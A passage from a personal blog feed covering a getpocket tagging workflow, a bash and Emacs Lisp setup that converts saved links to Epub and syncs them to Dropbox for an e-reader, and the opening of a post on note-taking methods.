). What we want to have is a personalized categorization depending on your needs. Also dealing with a huge list like <a href="https://getpocket.com/my-list">my-list</a> can be also very time consuming. You need
to chunk the list in small portions in order to actually <strong>consume</strong> it.</p>
<p>I like the idea of buckets where you can put <strong>things in</strong>. In a perfect world you&rsquo;d want to have all your buckets
<strong>empty</strong> but I know that is hard to achieve.</p>
<figure><img src="/posts/img/2021/input-zero/buckets-all.png"
         alt="Figure 1: Different buckets/lists used at getpocket"/><figcaption>
            <p>Figure 1: Different buckets/lists used at getpocket</p>
        </figcaption>
</figure>

<h3 id="reading-state-tags">Reading state tags</h3>
<p>I use the initial list (my-list) as the first input gate from where I decide what to actually <strong>do</strong> with the content: Read it, share it, print it, delete it etc.</p>
<figure><img src="/posts/img/2021/input-zero/tags.png"
         alt="Figure 2: I use tags to manage my reading workflow"/><figcaption>
            <p>Figure 2: I use tags to manage my reading workflow</p>
        </figcaption>
</figure>

<h3 id="topics-tags">Topics tags</h3>
<p>Additionally I of course tag URLs based on topics (like programming language, politics, business etc.) among with
the tags describing each URLs reading state.</p>
<figure><img src="/posts/img/2021/input-zero/tags-with-topics.png"
         alt="Figure 3: Some URLs tagged with reading state tags and topics tags"/><figcaption>
            <p>Figure 3: Some URLs tagged with reading state tags and topics tags</p>
        </figcaption>
</figure>

<p>In the above figure I have 4 URLs which are tagged multiple times. When tagging stuff I differentiate between</p>
<ul>
<li>reading state tags</li>
<li>topics tags</li>
</ul>
<p>In my example I have 2 URLs which I&rsquo;d like to read (<code>2read</code>) and 2 which I&rsquo;d like to watch (<code>2watch</code>). Additionally
I also use <strong>topics tags</strong> in order to categorize my content also by content:</p>
<ul>
<li>URL #2 is about <a href="https://brainfck.org/#Python">Python</a> and <a href="https://brainfck.org/#Blockchain">Blockchain</a></li>
<li>URL #3 is about politics</li>
</ul>
<h2 id="use-tags-wisely">Use tags wisely</h2>
<p>Whether tagging is good or not has been a controverse topic around <a href="https://brainfck.org/#Zettelkasten">Zettelkasten</a> which doesn&rsquo;t recommend tagging (at least in an information system). Here you can read more:</p>
<ul>
<li><a href="https://notes.andymatuschak.org/z6ztEgzqZichYTJgabhYQLn4UY4FbC1JMH394">Indexed references vs. tags</a></li>
<li><a href="https://fortelabs.co/blog/tagging-is-broken/">Tagging is broken (fortelabs.co)</a></li>
<li><a href="https://forum.zettelkasten.de/discussion/915/tags-vs-zettel-links">Tags vs Zettels</a></li>
<li><a href="https://zettelkasten.de/posts/object-tags-vs-topic-tags/">The Difference Between Good and Bad Tags</a></li>
<li><a href="https://forum.obsidian.md/t/tags-vs-page-link/193/21">Tags vs. page/link (obsidian.md)</a></li>
</ul>
<p>However, I merely use the tags to define a state which helps my overall reading workflow. Initially I&rsquo;ve read about this
idea in <a href="https://daryl.wakatara.com/the-information-overload-gtd-flow/">Daryl&rsquo;s awesome article on his own GTD workflow</a>. It helped me a lot to</p>
<p>Here are these together with some explanations.</p>
<h3 id="2read">2read</h3>
<ul>
<li>this is pretty much self-explanatory: mark items/articles I want to <strong>read</strong></li>
<li>this might no seem obvious (why tagging articles as to-read when using a save-for-later-read service?) but I sometimes getpocket for temporary storage
<ul>
<li>I temporarly add articles/links to it</li>
<li>This way the global <strong>input</strong> bucket will eventually get cloaked</li>
</ul>
</li>
</ul>
<h3 id="2watch">2watch</h3>
<ul>
<li>used to mark items/links that contain some videos</li>
<li>Whenever I have time to watch some videos I use this list to check what I&rsquo;ve marked for watching</li>
<li>I mostly used this for Youtube videos
<ul>
<li>But also for articles that contain videos (self-hosted)</li>
</ul>
</li>
</ul>
<h3 id="2listen">2listen</h3>
<ul>
<li>this is mostly about podcasts
<ul>
<li>I tag the whole podcast or specific episodes</li>
</ul>
</li>
</ul>
<h3 id="2share">2share</h3>
<ul>
<li>The content I&rsquo;m reading/watching is sometimes worth to be <strong>shared</strong>
<ul>
<li>I either share it with friends/colleagues/family</li>
<li>Add the link to some (bookmark) list (like <a href="/bookmarks/">these ones</a>)</li>
<li>Or I put into my <a href="https://brainfck.org/#Tiddlywiki">Tiddlywiki</a> instance as a bookmark</li>
</ul>
</li>
</ul>
<h3 id="2print">2print</h3>
<ul>
<li>I don&rsquo;t own a printer at home so whenever I&rsquo;m at the copy shop I&rsquo;d like to have a list of documents/articles to be printed</li>
<li>I also put Google Docs links into Getpocket and tag them by <code>2print</code></li>
</ul>
<h3 id="2go">2go</h3>
<ul>
<li>I sometimes search for local coffee shops or interesting places I&rsquo;d like to go to</li>
<li>this tag helps mark those places so I can find them again</li>
</ul>
<h2 id="my-setup">My setup</h2>
<p>In this last section I&rsquo;ll share some details regarding my workflow, which (getpocket) clients I use and how I manage to stay focussed while going through my articles.</p>
<h3 id="browser-add-on">Browser add-on</h3>
<p>Getpocket has for almost every browser <a href="https://help.getpocket.com/category/846-category">add-ons</a> you can easily use to add content on-the-fly. Try to remember the keyboard shortcuts (I use <a href="https://github.com/brookhong/Surfingkeys">Surfingkeys</a> but that&rsquo;s a different story) for frictionless interaction. In Chrome for example you can use <code>CMD+Shift+P</code> (OS X) or <code>Ctrl+Shift+P</code> (Windows/Linux) to add current site to getpocket.</p>
<p>I rarely use this functionality since I try to avoid the browser as much as I can. Not because I&rsquo;m a freak but
because of distractions every page has to offer. When I want to read sth (and I know there is readmode for Chrome)
I don&rsquo;t want to get distrupted by ads. Whenever I can, I try to read on my E-Reader after having converted the articles to epub and uploaded them to Dropbox.</p>
<h3 id="doom--emacs">(Doom) Emacs</h3>



<blockquote class="notice info">
  <p><strong><strong>Dotfiles</strong></strong></p>
<p>You can also check my <a href="https://github.com/dorneanu/dotfiles/tree/master/emacs/doom/.doom.d">dotfiles</a> if you want to get straight to the point.</p>

</blockquote>

<p>During the last 2 years I&rsquo;ve become a huge <a href="https://brainfck.org/#Emacs">Emacs</a> fan and currently I&rsquo;m also learning some <a href="https://brainfck.org/#Lisp">Lisp</a> to even add more customizations.</p>
<p>When it comes to getpocket there is <a href="https://github.com/alphapapa/pocket-reader.el">pocket-reader.el</a> which is <strong>the</strong> getpocket client for Emacs.</p>
<p>
    <asciinema-player
        src="/casts/inbox-zero-getpocket.cast"
        cols="800"
        rows="25"
        
        preload="1"
        
        start-at="0"
        speed="1"
        
        poster="#ZgotmplZ"
        font-size="10px"
        
        
        
        
        
    ></asciinema-player>
</p>

<h3 id="workflow">Workflow</h3>
<p>Depending on the content (if it&rsquo;s a Youtube link, an article, a podcast episode) I&rsquo;ll add accordingly <code>2read</code>, <code>2listen</code> etc. Sometimes I only want to add that link to a collection of links/bookmarks, so it will only get <code>2share</code>. In <code>pocket-reader</code> I&rsquo;ll then search for items tagged by <code>2share</code>, copy the links and <strong>archive</strong> (I&rsquo;ll get to this one immediately) them.</p>
<p>After having tagged the items by <code>2read</code>, <code>2watch</code>, <code>2listen</code>, etc. I then decide which items should get my attention
first. How do I do this? Given GTD&rsquo;s statement that <a href="https://brainfck.org/#GTD%20Managing%20attention">open loops will attract attention</a> I try to give my brain some &ldquo;break&rdquo; from the long <code>2read</code> list. Instead I only tag a few by <code>next</code>
which I&rsquo;ll actually read and focus on. After I have finished reading <strong>all</strong> of them, I remove the tags <code>2read</code> and <code>next</code>, <strong>archive</strong> the items and add <strong>new</strong> ones (by adding <code>next</code> to some items in the <code>2read</code> bucket). Sounds complicated? Let me try to explain using a sequence diagram.</p>
<figure><img src="/posts/img/2021/input-zero/workflow-2share.png"
         alt="Figure 5: My 2share workflow"/><figcaption>
            <p>Figure 5: My 2share workflow</p>
        </figcaption>
</figure>

<p>The <code>2share</code> workflow consists of several steps:</p>
<ul>
<li>add item to initial list (my-list)
<ul>
<li>may I already tag the item by <code>2share</code></li>
</ul>
</li>
<li>then I share that item with family, friends etc.
<ul>
<li>or add it to some collection (e.g. bookmarks)</li>
</ul>
</li>
<li>I remove tag <code>2share</code></li>
<li>I archive the item</li>
</ul>
<figure><img src="/posts/img/2021/input-zero/workflow-2read.png"
         alt="Figure 6: My 2read workflow"/><figcaption>
            <p>Figure 6: My 2read workflow</p>
        </figcaption>
</figure>

<p>The steps here are quite similar:</p>
<ul>
<li>I add the article to the initial list
<ul>
<li>I might have already tagged the item by <code>2read</code></li>
</ul>
</li>
<li>I&rsquo;ll fetch the <code>next</code> list, convert it to epub and sent it to Dropbox
<ul>
<li>or eventually I read the item straight away on my phone/desktop</li>
</ul>
</li>
<li>I might also tag that specific item by <code>2share</code>
<ul>
<li>in case I want to share it</li>
</ul>
</li>
<li>I remove tags <code>2read</code> and <code>next</code></li>
<li>I archive the item</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>When used wisely <code>getpocket</code> can be an awesome tool (same applies for any other bookmarking/read-later service). Not only you&rsquo;ll save more time by having the right workflow (and discipline!) for your content management, but
you&rsquo;ll also get to read lot more. I&rsquo;d like to know more about your workflows, how you deal with content to-be-read and what kind of tools/services you use.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Convert pocket reader links to Epub and upload to Dropbox</title>
      <link>https://blog.dornea.nu/2021/08/15/howto-convert-pocket-reader-links-to-epub-and-upload-to-dropbox/</link>
      <pubDate>Sun, 15 Aug 2021 00:00:00 +0200</pubDate>
      
      <guid>https://blog.dornea.nu/2021/08/15/howto-convert-pocket-reader-links-to-epub-and-upload-to-dropbox/</guid>
      <content:encoded><![CDATA[<h2 id="read-organize-archive">Read, organize, archive</h2>
<p>I heavily use <a href="https://getpocket.com">getpocket</a> to collect articles and save them for later reading. While on my mobile devices I use the official
app, on my desktop systems (mostly tmux +<a href="https://brainfck.org/#Emacs"> Emacs</a>) I use <a href="https://github.com/alphapapa/pocket-reader.el">pocket-reader.el</a> quite heavily to collect/organize/archive my list of
articles. After my transition from <a href="https://www.spacemacs.org/">Spacemacs</a> to <a href="https://github.com/hlissner/doom-emacs">Doom Emacs</a> I still love <a href="https://github.com/emacs-evil/evil">evil</a> mode and like to do most of the stuff in <code>normal</code>
mode. That&rsquo;s why I&rsquo;ve added some <a href="https://github.com/dorneanu/dotfiles/blob/master/emacs/doom/.doom.d/%2Bbindings.el#L25">keybindings to pocket-reader</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-elisp" data-lang="elisp">(<span style="color:#40ffff">map!</span> <span style="color:#24909d">:map</span> <span style="color:#40ffff">pocket-reader-mode-map</span>
      <span style="color:#24909d">:after</span> <span style="color:#40ffff">pocket-reader</span>
      <span style="color:#24909d">:nm</span> <span style="color:#ed9d13">&#34;d&#34;</span> <span style="color:#447fcf">#&#39;</span><span style="color:#40ffff">pocket-reader-delete</span>
      <span style="color:#24909d">:nm</span> <span style="color:#ed9d13">&#34;a&#34;</span> <span style="color:#447fcf">#&#39;</span><span style="color:#40ffff">pocket-reader-toggle-archived</span>
      <span style="color:#24909d">:nm</span> <span style="color:#ed9d13">&#34;TAB&#34;</span> <span style="color:#447fcf">#&#39;</span><span style="color:#40ffff">pocket-reader-open-url</span>
      <span style="color:#24909d">:nm</span> <span style="color:#ed9d13">&#34;tr&#34;</span> <span style="color:#447fcf">#&#39;</span><span style="color:#40ffff">pocket-reader-remove-tags</span>
      <span style="color:#24909d">:nm</span> <span style="color:#ed9d13">&#34;ta&#34;</span> <span style="color:#447fcf">#&#39;</span><span style="color:#40ffff">pocket-reader-add-tags</span>
      <span style="color:#24909d">:nm</span> <span style="color:#ed9d13">&#34;gr&#34;</span> <span style="color:#447fcf">#&#39;</span><span style="color:#40ffff">pocket-reader-refresh</span>
      <span style="color:#24909d">:nm</span> <span style="color:#ed9d13">&#34;p&#34;</span> <span style="color:#447fcf">#&#39;</span><span style="color:#40ffff">pocket-reader-search</span>
      <span style="color:#24909d">:nm</span> <span style="color:#ed9d13">&#34;y&#34;</span> <span style="color:#447fcf">#&#39;</span><span style="color:#40ffff">pocket-reader-copy-url</span>
      <span style="color:#24909d">:nm</span> <span style="color:#ed9d13">&#34;Y&#34;</span> <span style="color:#447fcf">#&#39;</span><span style="color:#40ffff">dorneanu/pocket-reader-copy-to-scratch</span>)
</code></pre></div><p>This way I can add/remove tags, archive articles, open links without leaving normal mode in <code>evil</code>.</p>
<h2 id="read-later-on-e-reader">Read later on E-Reader</h2>
<p>Since I tend to read on my <a href="https://pocketbook.de/de%5Fde/inkpad-3-dark-brown">e-reader</a> most of the time, I also wanted to have an almost automated way of saving articles to <strong>Epub</strong>
and send these to my device. Fortunately PocketBook devices can sync with Dropbox which made my life quite easy in the past. I just had to copy e-books, PDFs, Epubs to a specific folder in Dropbox and these will eventually sync with my device once WiFi
is activated. That&rsquo;s first step of automation.</p>
<p>As for the Epub conversion I&rsquo;ve used <a href="https://pandoc.org/">pandoc</a> in the past which still does its job great. Initially I&rsquo;ve used <a href="https://github.com/Y2Z/monolith">monolith</a> to save complete web pages as HTML but I&rsquo;ve realized the HTML also contained useless ads, images, text. That&rsquo;s why I&rsquo;ve searched for
ways how to make the content more <strong>readable</strong> and discovered <a href="https://github.com/eafer/rdrview">rdrview</a>. It&rsquo;s written in C and applies <a href="https://support.mozilla.org/en-US/kb/firefox-reader-view-clutter-free-web-pages">Firefox&rsquo;s reader view</a> to web pages. Here are some examples:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ rdrview -M http://blog.dornea.nu/2021/06/13/note-taking-in-2021/
Title: Note taking in <span style="color:#3677a9">2021</span> - blog.dornea.nu
Excerpt: [Update 2021-06-22] If youâ€™re more interested in the Tiddlywiki aspect of this post you can also check this Tiddlywiki Google Groups thread. [Update 2021-06-18] This post caught some attention on this Hackernews thread. You might want to check the comments. Based on the recommendations in the thread Iâ€™ve put together a list of (digital) solutions (besides the preferred ones) Almost <span style="color:#3677a9">6</span> years ago I was blogging about organizing and visualizing knowledge.
Readerable: Yes
</code></pre></div><div class="src-block-caption">
  <span class="src-block-number">Code Snippet 1</span>:
  Get meta information
</div>
<p>And now I&rsquo;m using some <code>xpath</code> to extract the title:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ rdrview -T title,body -H http://blog.dornea.nu/2021/06/13/note-taking-in-2021/ | xmllint --html --xpath <span style="color:#ed9d13">&#34;//div/h1/text()&#34;</span> -
Note taking in <span style="color:#3677a9">2021</span> - blog.dornea.nu
</code></pre></div><p>Below I&rsquo;ve glued everything together in order to:</p>
<ul>
<li>convert an URL to epub</li>
<li>extract the title and use it as the filename for the Epub</li>
<li>do the converion using <a href="https://pandoc.org/">pandoc</a></li>
<li>use <a href="https://rclone.org/">rclone</a> to copy the file to Dropbox</li>
</ul>
<!--listend-->
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#cd2828;font-weight:bold">#!/bin/bash
</span><span style="color:#cd2828;font-weight:bold"></span>
<span style="color:#40ffff">RDRVIEW_OUTPUT</span>=~/work/dropbox/rdrview
<span style="color:#40ffff">DROPBOX_DIR</span>=<span style="color:#ed9d13">&#34;dropbox:Apps/Dropbox PocketBook/articles/2021/&#34;</span>

add_link_to_dropbox() {
    <span style="color:#999;font-style:italic"># Create tmp file</span>
    <span style="color:#40ffff">TEMP_FILE</span>=<span style="color:#6ab825;font-weight:bold">$(</span>mktemp<span style="color:#6ab825;font-weight:bold">)</span>

    <span style="color:#999;font-style:italic"># Make link readable</span>
    rdrview -T title,body -H <span style="color:#40ffff">$1</span> &gt; <span style="color:#40ffff">$TEMP_FILE</span>

    <span style="color:#999;font-style:italic"># Extract title</span>
    <span style="color:#40ffff">TITLE</span>=<span style="color:#6ab825;font-weight:bold">$(</span>xmllint --html --xpath <span style="color:#ed9d13">&#34;//div/h1/text()&#34;</span> 2&gt;/dev/null <span style="color:#ed9d13">${</span><span style="color:#40ffff">TEMP_FILE</span><span style="color:#ed9d13">}</span><span style="color:#6ab825;font-weight:bold">)</span>
    <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;[-] Converting </span><span style="color:#40ffff">$TITLE</span><span style="color:#ed9d13">&#34;</span>

    <span style="color:#999;font-style:italic"># Convert to PDF</span>
    <span style="color:#40ffff">OUTPUT_FILE</span>=<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">${</span><span style="color:#40ffff">RDRVIEW_OUTPUT</span><span style="color:#ed9d13">}</span><span style="color:#ed9d13">/</span><span style="color:#ed9d13">${</span><span style="color:#40ffff">TITLE</span>// /_<span style="color:#ed9d13">}</span><span style="color:#ed9d13">&#34;</span>.epub
    pandoc --pdf-engine=xelatex --metadata <span style="color:#40ffff">title</span>=<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">${</span><span style="color:#40ffff">TITLE</span><span style="color:#ed9d13">}</span><span style="color:#ed9d13">&#34;</span> -f html -t epub -o <span style="color:#ed9d13">${</span><span style="color:#40ffff">OUTPUT_FILE</span><span style="color:#ed9d13">}</span> <span style="color:#ed9d13">${</span><span style="color:#40ffff">TEMP_FILE</span><span style="color:#ed9d13">}</span>

    <span style="color:#999;font-style:italic"># Copy to dropbox</span>
    rclone copy <span style="color:#ed9d13">${</span><span style="color:#40ffff">OUTPUT_FILE</span><span style="color:#ed9d13">}</span> <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">${</span><span style="color:#40ffff">DROPBOX_DIR</span><span style="color:#ed9d13">}</span><span style="color:#ed9d13">&#34;</span>

    <span style="color:#999;font-style:italic"># Log</span>
    <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;[-] Successfully added </span><span style="color:#ed9d13">${</span><span style="color:#40ffff">OUTPUT_FILE</span><span style="color:#ed9d13">}</span><span style="color:#ed9d13"> to dropbox.&#34;</span>

    <span style="color:#999;font-style:italic"># Clean up</span>
    rm <span style="color:#40ffff">$TEMP_FILE</span>
    rm <span style="color:#40ffff">$OUTPUT_FILE</span>
}

add_link_to_dropbox <span style="color:#40ffff">$1</span>
</code></pre></div><p>Let&rsquo;s give it a try using <a href="https://pandoc.org/">https://pandoc.org/</a> as an URL:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ~/work/dropbox/add_links_to_dropbox https://pandoc.org/
[-] Converting Pandoc - About pandoc
[-] Successfully added /home/victor/work/dropbox/rdrview/Pandoc_-_About_pandoc.epub to dropbox.
</code></pre></div><h2 id="emacs-for-everything">Emacs for Everything</h2>
<p>Now I&rsquo;d like to be able to call that script from Emacs without copy/paste URLs and hand them over to my script.
The most difficult part here was to come up with some valid Elisp code. What I wanted was:</p>
<ul>
<li>in <code>pocket-reader</code> copy entry&rsquo;s URL to <code>scratch</code> buffer</li>
<li>once I have collected the list of URLs for which I want the Epub conversion
<ul>
<li>take the list and use it as input for my script</li>
<li>use <code>xargs</code> since my script takes only one argument</li>
</ul>
</li>
</ul>
<p>And this is what I&rsquo;ve got (my first elisp <a href="https://github.com/dorneanu/dotfiles/blob/master/emacs/doom/.doom.d/%2Bfunctions.el#L159">function</a> ever):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-elisp" data-lang="elisp"><span style="color:#999;font-style:italic">;; Copy current url to scratch buffer</span>
(<span style="color:#24909d">defun</span> <span style="color:#40ffff">dorneanu/pocket-reader-copy-to-scratch</span> ()
  <span style="color:#ed9d13">&#34;Copy URL of current item to kill-ring/clipboard.&#34;</span>
  (<span style="color:#24909d">interactive</span>)
  (<span style="color:#40ffff">when-let</span> ((<span style="color:#40ffff">id</span> (<span style="color:#40ffff">tabulated-list-get-id</span>))
             (<span style="color:#40ffff">item</span> (<span style="color:#40ffff">ht-get</span> <span style="color:#40ffff">pocket-reader-items</span> <span style="color:#40ffff">id</span>))
             (<span style="color:#40ffff">url</span> (<span style="color:#40ffff">pocket-reader--get-url</span> <span style="color:#40ffff">item</span>)))
    (<span style="color:#24909d">with-current-buffer</span> <span style="color:#ed9d13">&#34;*scratch*&#34;</span>
      (<span style="color:#447fcf">insert</span> <span style="color:#40ffff">url</span>)
      (<span style="color:#40ffff">newline</span>))
     (<span style="color:#447fcf">message</span> <span style="color:#ed9d13">&#34;Added: %s to scratch buffer&#34;</span> <span style="color:#40ffff">url</span>)))
</code></pre></div><p>This will <code>insert</code> the URL into the <code>scratch</code> buffer and add a new line. Once you have your URLs in the buffer you can
use <code>shell-command-on-region</code> with <code>xargs -n1 &lt;script&gt;</code> as shown in the asciinema below.</p>
<h2 id="demo">Demo</h2>
<p>
    <asciinema-player
        src="/casts/first.cast"
        cols="800"
        rows="40"
        
        preload="1"
        
        start-at="0"
        speed="1"
        
        
        font-size="10px"
        
        
        
        
        
    ></asciinema-player>
</p>

]]></content:encoded>
    </item>
    
    <item>
      <title>Note taking in 2021</title>
      <link>https://blog.dornea.nu/2021/06/13/note-taking-in-2021/</link>
      <pubDate>Sun, 13 Jun 2021 14:56:00 +0200</pubDate>
      
      <guid>https://blog.dornea.nu/2021/06/13/note-taking-in-2021/</guid>
      <content:encoded><![CDATA[


<blockquote class="notice info">
  <p><strong><strong>[Update 2021-06-22]</strong></strong></p>
<p>If you&rsquo;re more interested in the Tiddlywiki aspect of this post you can also check this <a href="https://groups.google.com/g/tiddlywiki/c/vlAZ%5FK4K63o/m/cPuFWVIKAQAJ">Tiddlywiki Google Groups thread</a>.</p>

</blockquote>




<blockquote class="notice info">
  <p><strong><strong>[Update 2021-06-18]</strong></strong></p>
<p>This post caught some attention on <a href="https://news.ycombinator.com/item?id=27513008">this Hackernews thread</a>. You might want to check the comments. Based on the recommendations in the thread I&rsquo;ve put together a list of (digital) solutions (besides the preferred ones)</p>

</blockquote>

<p>Almost 6 years ago I was blogging about <a href="/2015/09/17/organizing-and-visualizing-knowledge/">organizing and visualizing knowledge</a>. At that time I was just playing around with <a href="https://brainfck.org/#Tiddlywiki"> Tiddlywiki</a> and using it to collect notes during my <a href="/tags/ccna/">CCNA</a> course. I couldn&rsquo;t anticipate to which extent <a href="https://en.wikipedia.org/wiki/Personal%5Fknowledge%5Fmanagement">personal knowledge management systems</a> would become famous and trendy. And people nowadays don&rsquo;t blog anymore: They take care of their <a href="https://joelhooks.com/digital-garden">digital gardens</a>. While most of them seem to be just a collection of random notes, there are actually good ones where you can actually read through the thoughts/notes and learn something new. Here are my favourite ones:</p>
<ul>
<li><a href="https://notes.andymatuschak.org/About%5Fthese%5Fnotes">Andy Matuschanks Digital Garden</a></li>
<li><a href="https://braindump.jethro.dev/">Jethro&rsquo;s Braindump</a> (build with <a href="https://brainfck.org/#ORG%20Mode"> ORG Mode)</a> and <a href="https://ox-hugo.scripter.co/">ox-hugo</a>)
<ul>
<li>more in his <a href="https://github.com/jethrokuan/braindump">github repository</a></li>
</ul>
</li>
<li><a href="https://zettelkasten.sorenbjornstad.com/">Personal Zettelkasten of Soeren</a>
<ul>
<li>Did I already mention what a <a href="https://brainfck.org/#Zettelkasten"> Zettelkasten</a> is about?</li>
</ul>
</li>
</ul>
<p>And what about me? Yes, I still blog but I also have a digital garden available at <a href="https://brainfck.org">brainfck.org</a>. For me blogging and maintaining a public source of inspirations and ideas is not the same. A blog post should be readable and contain full sentences. A collection of ideas/thoughts can be just some bullet points with some random links (for me they&rsquo;re not random, since I actively set those links in order to inter-connect notes). The idea is that I use my <code>PKMS</code> to lookup things and generate new content (like this post). That&rsquo;s for the introduction. Now let&rsquo;s talk about the importance of having and maintaining a source of notes/thoughts.</p>
<h2 id="motivation">Motivation</h2>
<p>After all: What&rsquo;s all the fuzz about &ldquo;note taking&rdquo;? You have them <strong>somewhere</strong>, you use them <strong>somehow</strong>. Well, there it&rsquo;s more than that. In my job as a Security Engineer I need to keep up with new technologies and arising attack vectors. Additionally I tend to <a href="https://brainfck.org/#Books">read</a> about non-IT topics I&rsquo;m currently
interested in. Each time I want to make sure I don&rsquo;t have to re-read/review that source again when I think I might use an interesting idea/concept out of it.
Making future-proof notes (a terminology used in a <a href="https://brainfck.org/#Zettelkasten"> Zettelkasten</a> system) is essential for me also because I use that content to generate new one.</p>
<p>Not only in a professional context, but also for private purposes it does make sense to <strong>actively</strong> read your books/articles. Try to apply some <strong>analytical reading</strong>, a concept I&rsquo;ve read about for the first time in <a href="https://brainfck.org/#How%20to%20read%20a%20book"> How to read a book (book)</a>. The idea is to interact with the content you&rsquo;re reading about: Ask questions, try to link ideas in your mind, make notes, lookup complex definitions. The worst thing you can do is to just <strong>passively</strong> read something, finish it and then you move on to your next reading. After finishing a book, I always take some time (1-3 hours) to go through my notes, adjust already existing ones or link them to other ones.</p>
<h2 id="the-perfect-setup">The perfect setup</h2>
<p>I&rsquo;ve spent the last years, trying to find not only the perfect note <strong>taking</strong> system but also the most proficient note <strong>storage</strong> system. I don&rsquo;t want to dissapoint you, but there is no perfect solution. You just need one system that fulfills <strong>your needs</strong>, is easy to use and will most probably still work in a couple of years.
Let&rsquo;s have a look at my current setup which has envolved over the last 2-3 years and definitely will change whenever I think I can optimize each step individually.</p>
<h2 id="note-taking">Note taking</h2>
<p>For me this is the most important step when dealing with sources of information in general. The process of note taking is supposed to help you to internalize the main concepts and the authors ideas. In this step taking <strong>temporary notes</strong> as described by SÃ¶hnke Ahrens in his book &ldquo;How to take smart notes&rdquo; (german: <a href="https://brainfck.org/#Das%20Zettelkasten-Prinzip"> Das Zettelkasten-Prinzip</a>) will give you a good starting point for storing them in a <strong>permanent</strong> manner. But more on this below.</p>
<h3 id="pen-and-paper">Pen and paper</h3>
<p>This is still my favourite way of writing things down and collecting so called <strong>temporary notes</strong> as described by SÃ¶hnke Ahrens in his book &ldquo;How to take smart notes&rdquo; (german: <a href="https://brainfck.org/#Das%20Zettelkasten-Prinzip"> Das Zettelkasten-Prinzip</a>). All you need is just a piece of paper and something to write. You&rsquo;re free to use whatever structure you want as long as it doesn&rsquo;t disturb your reading flow. Add diagrams, bullet points, symbols or everything you think is necessary.</p>
<p>The downside of this analogue method is the fact your notes could get lost at some point. You have no automated backups in-place and if you lose your &ldquo;paper&rdquo; notes,
also your work is gone.</p>
<h4 id="some-examples">Some examples</h4>
<figure><img src="/posts/img/2021/note-taking/note-taking-paper.jpg"
         alt="Figure 1: Taking notes on A5 paper (notes for the book 1984)"/><figcaption>
            <p>Figure 1: Taking notes on A5 paper (notes for the book <a href="https://brainfck.org/#1984">1984</a>)</p>
        </figcaption>
</figure>

<figure><img src="/posts/img/2021/note-taking/note-taking-technical.jpg"
         alt="Figure 2: The same also for tech books (notes for the book Black Hat Go)"/><figcaption>
            <p>Figure 2: The same also for tech books (notes for the book <a href="https://brainfck.org/#Black%20Hat%20Go">Black Hat Go</a>)</p>
        </figcaption>
</figure>

<figure><img src="/posts/img/2021/note-taking/note-taking-a4.jpg"
         alt="Figure 3: Taking notes in a A4 notebook (notes for How not to die)"/><figcaption>
            <p>Figure 3: Taking notes in a A4 notebook (notes for <a href="https://brainfck.org/#How%20not%20to%20die"> How not to die</a>)</p>
        </figcaption>
</figure>

<figure><img src="/posts/img/2021/note-taking/note-taking-a5.jpg"
         alt="Figure 4: Works with A5 as well (its easier to carry it around, notes for The Big Five for Life)"/><figcaption>
            <p>Figure 4: Works with A5 as well (its easier to carry it around, notes for <a href="https://brainfck.org/#The%20Big%20Five%20for%20Life">The Big Five for Life</a>)</p>
        </figcaption>
</figure>

<figure><img src="/posts/img/2021/note-taking/note-taking-project.jpg"
         alt="Figure 5: A5 is also good for keeping track of (non-IT) projects such as camping boxes for the car :)"/><figcaption>
            <p>Figure 5: A5 is also good for keeping track of (non-IT) projects such as camping boxes for the car :)</p>
        </figcaption>
</figure>

<figure><img src="/posts/img/2021/note-taking/note-taking-djembe.jpg"
         alt="Figure 6: I also use paper to store patterns, notes for drumming (in my example Djembe/Darbuka). I can always carry them around and I have everything at one place."/><figcaption>
            <p>Figure 6: I also use paper to store patterns, notes for drumming (in my example Djembe/Darbuka). I can always carry them around and I have everything at one place.</p>
        </figcaption>
</figure>

<h3 id="smartphone">Smartphone</h3>
<p>Yes, this might surprise you, but I do use my smartphone to take notes, especially when I don&rsquo;t have a &ldquo;piece of paper&rdquo; with me. The best thoughts will come to your mind when you don&rsquo;t expect them to do so. And in that case you should be better prepared to write them down.</p>
<h4 id="orgzly">orgzly</h4>
<p>At some point I&rsquo;ve started using <a href="http://www.orgzly.com/">orgzly</a> which worked fine for <a href="https://brainfck.org/#ORG%20Mode"> ORG mode</a> in combination with <a href="https://syncthing.net/">syncthing</a> for the cross-device synchronization. However, once I&rsquo;ve came back to <a href="https://brainfck.org/#Tiddlywiki"> Tiddlywiki</a> I&rsquo;ve somehow abandoned orgzly in flavour of <a href="https://mimind.cryptobees.com/">miMind</a>.</p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/GYhIMHjGzjQ" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

<h4 id="mimind-pro">miMind pro</h4>
<p>This little (mobile) application has great usability and it does help you to quickly add new notes, structured as a mind map. You can then easily export your map as XML which can then be converted to <a href="/tags/org">ORG</a> format.</p>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/IR-8q6TQZ7c" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>

